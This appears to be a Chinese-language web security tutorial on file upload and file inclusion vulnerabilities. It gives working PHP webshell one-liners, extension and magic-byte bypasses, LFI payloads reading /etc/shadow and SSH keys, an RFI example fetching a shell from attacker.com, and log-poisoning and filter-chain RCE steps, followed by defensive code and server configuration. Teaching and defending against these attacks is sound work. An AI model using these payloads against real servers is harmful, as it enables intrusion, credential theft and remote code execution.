文件上传与文件包含漏洞

CRITICAL 文件上传漏洞可直接导致远程代码执行（RCE）。文件包含漏洞可读取敏感文件或执行恶意代码。两者常配合使用。

1. 文件上传漏洞概述

文件上传攻击流程： 攻击者 目标服务器 | | | 上传 "avatar.php" | | (内容是PHP webshell) | |─────────────────────────────→| | | 保存到 /uploads/avatar.php | | | 访问上传的文件 | | GET /uploads/avatar.php?cmd=whoami |─────────────────────────────→| | | Web服务器将.php交给PHP解释器 | | 执行 webshell 代码 |←─────────────────────────── | | 返回: www-data | ← 命令执行成功！RCE! 关键条件： 1. 能上传恶意文件（绕过检测） 2. 知道上传后的文件路径 3. 文件能被Web服务器解释执行

1.1 常见验证方式及弱点

验证方式实现绕过难度绕过方法
前端JS验证JavaScript检查后缀极易禁用JS / 直接改请求
Content-Type 检查检查MIME类型易修改请求头为 image/jpeg
文件后缀黑名单禁止 .php/.jsp 等中使用 .phtml/.php5/.PhP 等
文件后缀白名单只允许 .jpg/.png 等较难需配合解析漏洞
文件头（Magic Bytes）检查文件前几字节中在PHP前加GIF89a
文件内容检测解析图片/检查恶意代码较难图片马(metadata注入)
重命名+随机化上传后重命名为随机名难需要找到文件路径

2. 上传绕过技术大全

2.1 后缀名绕过

# PHP 可执行后缀（取决于配置）
.php .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .pgif .shtml

# ASP/ASPX
.asp .aspx .ashx .asmx .cer .asa .cdx

# JSP
.jsp .jspx .jsw .jsv .jspf

# 大小写绕过
.PhP .pHp .PHP

# 双重后缀
.php.jpg        (某些系统只检查最后一个后缀)
.jpg.php        (Apache 可能按最后识别的后缀处理)

# 特殊字符
shell.php%00.jpg    (Null字节截断 - 旧版PHP/Nginx)
shell.php;.jpg      (分号截断 - IIS)
shell.php::$DATA    (NTFS ADS - Windows)
shell.php .         (末尾空格/点 - Windows)
shell.php...        (多点 - Windows)

# .htaccess 覆盖（如果能上传.htaccess）
# 上传 .htaccess 文件内容：
AddType application/x-httpd-php .jpg
# → 之后上传的 .jpg 文件会被当作 PHP 执行！

2.2 Content-Type 绕过

# 修改请求中的 Content-Type
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitBoundary

------WebKitBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        ← 改为图片的MIME类型

<?php system($_GET['cmd']); ?>
------WebKitBoundary--

2.3 文件头（Magic Bytes）绕过

# 在 PHP 代码前添加图片文件头

# GIF89a (最简单)
GIF89a
<?php system($_GET['cmd']); ?>

# PNG 头
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# JPEG 头
echo -e '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# 图片马：将PHP代码嵌入真实图片的EXIF/Comment中
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

2.4 Web服务器解析漏洞

服务器漏洞利用方式
Apache多后缀解析shell.php.xxx → 如果 xxx 不识别，按 php 解析
Apache.htaccess上传 .htaccess 指定任意后缀为 PHP
Nginx路径解析漏洞/uploads/image.jpg/x.php → image.jpg 作为 PHP 执行
IIS 6.0目录解析/shell.asp/image.jpg → 作为 ASP 执行
IIS 6.0分号截断shell.asp;.jpg → 作为 ASP 执行
IIS 7.x同 Nginx 路径漏洞/image.jpg/x.php
Nginx 解析漏洞详解

当 Nginx 配置了 cgi.fix_pathinfo=1（PHP默认开启）：

请求: /uploads/avatar.jpg/nonexist.php
Nginx 发现 nonexist.php 不存在
→ 向上查找: /uploads/avatar.jpg 存在
→ 将 avatar.jpg 交给 PHP-FPM 处理
→ 如果 avatar.jpg 中含有 PHP 代码 → 执行！

4. 本地文件包含 (LFI)

LFI (Local File Inclusion)：当应用使用用户可控输入来包含本地文件时，攻击者可以读取任意文件或在特定条件下执行代码。

4.1 LFI 原理

# 漏洞代码 (PHP)
<?php
$page = $_GET['page'];
include($page . '.php');  // 或 include($page);
?>

# 正常请求
?page=about          → include('about.php')

# 攻击请求
?page=../../../etc/passwd%00     → include('/etc/passwd')  (Null截断, PHP<5.3)
?page=../../../etc/passwd        → include('/etc/passwd.php')  (无法截断时需找.php文件)
?page=/etc/passwd                → include('/etc/passwd.php')

# PHP 伪协议利用
?page=php://filter/read=convert.base64-encode/resource=config
→ 以 Base64 输出 config.php 源码（不会被执行）

?page=php://input
POST: <?php system('id'); ?>     → 执行POST中的PHP代码

?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

4.2 LFI 读取敏感文件

# Linux 敏感文件
/etc/passwd                 # 用户列表
/etc/shadow                 # 密码哈希(需root权限)
/etc/hosts                  # 主机名映射
/proc/self/environ          # 环境变量(可能含密钥)
/proc/self/cmdline          # 进程命令行
/var/log/apache2/access.log # Apache访问日志
/var/log/auth.log           # 认证日志
/home/user/.bash_history    # 命令历史
/home/user/.ssh/id_rsa      # SSH私钥

# Web应用相关
/var/www/html/wp-config.php     # WordPress配置
/var/www/html/.env              # 环境配置
/var/www/html/config/database.yml # Rails数据库配置

# Windows 敏感文件
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa

5. 远程文件包含 (RFI)

RFI (Remote File Inclusion)：包含远程服务器上的文件。比 LFI 更危险，可直接执行远程代码。但条件更苛刻：PHP 需要开启 allow_url_include=On。

# 漏洞代码同 LFI
<?php include($_GET['page']); ?>

# 攻击：包含攻击者服务器上的恶意文件
?page=http://attacker.com/shell.txt
# shell.txt 内容: <?php system($_GET['cmd']); ?>
# 服务器会下载并执行这个PHP代码！

# 注意事项：
# - 攻击者服务器上的文件不能有.php后缀（否则在攻击者服务器上就被执行了）
# - 使用 .txt 后缀，服务器返回纯文本，目标服务器再作为PHP解析
# - 如果目标代码有后缀拼接: include($page . '.php')
#   → 使用 ?page=http://attacker.com/shell.txt?    (问号截断)
#   → 或 ?page=http://attacker.com/shell.txt%00    (Null截断)

6. LFI 到 RCE 的技术

即使只有 LFI（不能 RFI），也有多种方法实现代码执行：

6.1 日志文件污染（Log Poisoning）

日志污染 → LFI → RCE： Step 1: 向Web服务器发送包含PHP代码的请求 GET /<?php system($_GET['cmd']); ?> HTTP/1.1 或 User-Agent: <?php system($_GET['cmd']); ?> Step 2: PHP代码被写入访问日志 /var/log/apache2/access.log 中包含了我们的PHP代码 Step 3: 通过LFI包含日志文件 ?page=../../../var/log/apache2/access.log&cmd=id → 日志中的PHP代码被执行！ 适用日志： - Apache: /var/log/apache2/access.log - Nginx: /var/log/nginx/access.log - SSH: /var/log/auth.log (通过SSH登录失败用户名注入) - Mail: /var/log/mail.log

6.2 PHP Session 文件包含

# PHP session 文件通常存储在:
# /tmp/sess_[SESSION_ID]
# /var/lib/php/sessions/sess_[SESSION_ID]

# Step 1: 找到一个会将用户输入存入session的功能
# 例如：用户名、搜索记录等

# Step 2: 设置 session 中包含 PHP 代码
# 例如注册用户名为: <?php system($_GET['cmd']); ?>

# Step 3: 通过 LFI 包含自己的 session 文件
?page=../../../tmp/sess_abc123def456&cmd=whoami

6.3 /proc/self/fd 技巧

# Linux /proc 文件系统暴露进程信息
# /proc/self/fd/ 包含当前进程的文件描述符

# 有时候上传的临时文件会出现在 fd 中
# 暴力遍历 fd 编号
?page=/proc/self/fd/0
?page=/proc/self/fd/1
...
?page=/proc/self/fd/10
# 找到包含上传内容的 fd → 代码执行

6.4 PHP filter chain RCE

# 2022年发现的技术：纯 php://filter 实现 RCE
# 不需要写文件、不需要日志、不需要session
# 通过链式 filter 构造任意字符

# 原理：通过多次 base64/iconv 转换，从空数据生成任意PHP代码
# 工具: https://github.com/synacktiv/php_filter_chain_generator

python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# 生成一个超长的 php://filter/... 链
# 将其作为 LFI 的参数即可 RCE

7. 防御方案

7.1 文件上传防御

# ✅ 完整的安全文件上传实现 (Python Flask)
import os
import uuid
import magic  # python-magic

UPLOAD_DIR = '/var/uploads/'  # 不在Web根目录下！
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
MAX_SIZE = 5 * 1024 * 1024  # 5MB

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    file = request.files.get('file')
    if not file:
        abort(400)

    # 1. 检查文件大小
    file.seek(0, 2)
    size = file.tell()
    file.seek(0)
    if size > MAX_SIZE:
        abort(413, "File too large")

    # 2. 检查后缀名（白名单）
    original_name = secure_filename(file.filename)
    ext = original_name.rsplit('.', 1)[-1].lower() if '.' in original_name else ''
    if ext not in ALLOWED_EXTENSIONS:
        abort(400, "File type not allowed")

    # 3. 检查MIME类型（文件内容）
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIMES:
        abort(400, "Invalid file content")

    # 4. 生成随机文件名（不保留原始名）
    new_filename = f"{uuid.uuid4().hex}.{ext}"

    # 5. 保存到Web目录外
    save_path = os.path.join(UPLOAD_DIR, new_filename)
    file.save(save_path)

    # 6. 如果是图片，重新处理（去除元数据/注入代码）
    if ext in {'jpg', 'jpeg', 'png', 'gif'}:
        reprocess_image(save_path)  # 用 Pillow 重新保存

    return {"url": f"/files/{new_filename}"}

7.2 文件包含防御

# ✅ PHP 安全配置
# php.ini
allow_url_include = Off      # 禁止远程文件包含
allow_url_fopen = Off        # 禁止远程文件打开
open_basedir = /var/www/     # 限制文件操作范围
disable_functions = system, exec, shell_exec, passthru, ...

# ✅ 代码层面：白名单
<?php
$allowed_pages = ['home', 'about', 'contact', 'faq'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowed_pages)) {
    include("pages/{$page}.php");
} else {
    include("pages/404.php");
}
?>

7.3 防御清单

层面措施
上传验证白名单后缀 + MIME检测 + 文件内容检查
文件存储存储在Web目录外 + 随机重命名
执行隔离上传目录禁止执行脚本(Nginx/Apache配置)
服务器配置修复解析漏洞 + 禁用危险PHP配置
文件包含白名单 + 禁止用户控制include路径
权限控制上传目录最小权限(644 文件, 755 目录)
 
# Nginx 配置：上传目录禁止执行PHP
location /uploads/ {
    # 禁止执行任何脚本
    location ~ \.(php|phtml|php5|php7)$ {
        deny all;
    }
    # 只允许访问特定类型
    location ~ \.(jpg|jpeg|png|gif|pdf)$ {
        expires 30d;
    }
}

# Apache .htaccess：禁止执行
<Directory "/var/www/uploads">
    php_admin_flag engine off
    RemoveHandler .php .phtml .php5
    AddType text/plain .php .phtml .php5
</Directory>
